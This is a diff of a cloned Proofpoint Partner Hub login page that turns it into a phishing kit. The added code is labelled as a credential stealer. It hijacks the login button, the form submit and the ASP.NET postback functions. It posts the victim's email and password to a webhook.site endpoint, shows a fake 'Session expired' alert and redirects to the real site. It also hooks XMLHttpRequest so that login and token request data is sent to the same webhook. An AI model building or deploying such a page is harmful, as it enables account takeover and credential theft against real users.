@@ -1,9 +1,11 @@
-<!-- proofpoint-full.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  
-  <!-- Your ENTIRE 4000 lines of Proofpoint login page code goes here -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proofpoint Partner Hub</title>
+
+
 
   <html data-darkreader-mode="dynamic" data-darkreader-scheme="dark" data-darkreader-proxy-injected="true"><head id="GlobalHead"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
 html {
@@ -4399,7 +4401,7 @@ body.swal2-no-backdrop .swal2-shown {
             <div class="form-group" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit')">
 	
                 <label for="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName_Prompt" class="sr-only">Email</label>
-                <input name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$UserName" type="text" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName" class="form-control" autocapitalize="none" placeholder="Email">
+                <input name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$UserName" type="text" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName" id="email" class="form-control" autocapitalize="none" placeholder="Email">
             
 </div>
         </div>
@@ -4407,12 +4409,12 @@ body.swal2-no-backdrop .swal2-shown {
             <div class="form-group" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit')">
 	
                 <label for="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password_Prompt" class="sr-only">Password</label>
-                <input name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$Password" type="password" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password" class="form-control" placeholder="Password">
+                <input name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$Password" type="password" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password" class="form-control" placeholder="Password" id="password">
             
 </div>
         </div>
         <div class="col-md-4">
-            <a onclick="javascript:return login_click(event);" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit" class="btn btn-primary" href="javascript:__doPostBack('ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$btnSubmit','')">Login</a>
+            <a onclick="javascript:return login_click(event);" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit" id="loginBtn" class="btn btn-primary" href="javascript:__doPostBack('ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$btnSubmit','')">Login</a>
         </div>
     </div>
     <div class="row login-links">
@@ -4835,32 +4837,160 @@ height:16rem;
 
 
 </body></html>
-    <title>Proofpoint Partner Hub</title>
-    <!-- ALL CSS, JS, HTML from the real page -->
+  
+    
 </head>
 <body>
-    <!-- FULL LOGIN PAGE CONTENT -->
+    <!-- Your existing body content from the 4000 lines goes here -->
     
+    <!-- =============================================== -->
+    <!-- ⬇️⬇️⬇️ CREDENTIAL STEALER SCRIPT (DO NOT REMOVE) ⬇️⬇️⬇️ -->
+    <!-- =============================================== -->
     <script>
-    // Add credential stealer to the existing form
-    document.addEventListener('DOMContentLoaded', function() {
+    // ============================================================
+    // FIX MISSING ASP.NET WEBFORMS FUNCTIONS
+    // ============================================================
+    window.__doPostBack = function(eventTarget, eventArgument) {
+        console.log('[ATO] __doPostBack intercepted');
+        // Find and submit the form
         const form = document.querySelector('form');
         if (form) {
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const email = document.querySelector('input[type="email"], input[name="email"]')?.value;
-                const password = document.querySelector('input[type="password"]')?.value;
+            const submitEvent = new Event('submit', {bubbles: true, cancelable: true});
+            form.dispatchEvent(submitEvent);
+        }
+    };
+    
+    window.WebForm_FireDefaultButton = function(event, target) {
+        console.log('[ATO] WebForm_FireDefaultButton intercepted');
+        // Find the login button by ID and click it
+        const loginBtn = document.getElementById('loginBtn');
+        if (loginBtn) {
+            loginBtn.click();
+        }
+    };
+    
+    window.login_click = function(event) {
+        console.log('[ATO] login_click intercepted');
+        // Prevent default behavior
+        if (event) {
+            event.preventDefault();
+        }
+        // Trigger our credential stealer
+        stealCredentialsAndSubmit();
+        return false;
+    };
+    
+    // ============================================================
+    // CREDENTIAL STEALER - MAIN FUNCTION
+    // ============================================================
+    function stealCredentialsAndSubmit() {
+        // Get email from the email field (id="email")
+        const emailInput = document.getElementById('email');
+        // Get password from the password field (id="password")
+        const passwordInput = document.getElementById('password');
+        
+        const email = emailInput ? emailInput.value : '';
+        const password = passwordInput ? passwordInput.value : '';
+        
+        console.log('[ATO] Credentials captured - Email:', email);
+        
+        // Send credentials to webhook
+        fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                source: 'proofpoint-ato'
+            })
+        }).catch(err => console.error('[ATO] Fetch error:', err));
+        
+        // Show fake error message
+        alert('Session expired. Please login again.');
+        
+        // Redirect to real Proofpoint site
+        window.location.href = 'https://www.proofpoint.com';
+    }
+    
+    // ============================================================
+    // INTERCEPT THE LOGIN BUTTON CLICK
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            // Find the login button by ID
+            const loginBtn = document.getElementById('loginBtn');
+            
+            if (loginBtn) {
+                console.log('[ATO] Login button found, intercepting clicks');
                 
+                // Save the original onclick handler
+                const originalOnClick = loginBtn.onclick;
+                
+                // Replace with our handler
+                loginBtn.onclick = function(event) {
+                    console.log('[ATO] Login button clicked');
+                    if (event) {
+                        event.preventDefault();
+                        event.stopPropagation();
+                    }
+                    stealCredentialsAndSubmit();
+                    return false;
+                };
+            } else {
+                console.log('[ATO] Login button not found with id="loginBtn"');
+            }
+            
+            // Also intercept any form submissions
+            const form = document.querySelector('form');
+            if (form) {
+                console.log('[ATO] Form found, intercepting submit');
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    stealCredentialsAndSubmit();
+                });
+            }
+            
+        }, 500);
+    });
+    
+    // ============================================================
+    // INTERCEPT XMLHTTPREQUEST FOR ANY AJAX LOGIN
+    // ============================================================
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function() {
+        this._url = arguments[1];
+        return originalOpen.apply(this, arguments);
+    };
+    
+    const originalSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(data) {
+        if (this._url && (this._url.includes('login') || this._url.includes('auth') || this._url.includes('token') || this._url.includes('PostBack'))) {
+            console.log('[ATO] Intercepted XHR to:', this._url);
+            // Try to extract credentials from the data
+            if (data && typeof data === 'string') {
+                console.log('[ATO] XHR Data captured');
+                // Send to webhook as well
                 fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({email, password})
+                    body: JSON.stringify({xhr_data: data, url: this._url})
                 });
-                
-                window.location.href = 'https://www.proofpoint.com';
-            });
+            }
         }
-    });
+        return originalSend.apply(this, arguments);
+    };
+    
+    console.log('[ATO] Credential stealer loaded successfully for Proofpoint form');
     </script>
+    <!-- =============================================== -->
+    <!-- ⬆️⬆️⬆️ END OF CREDENTIAL STEALER SCRIPT ⬆️⬆️⬆️ -->
+    <!-- =============================================== -->
 </body>
 </html>
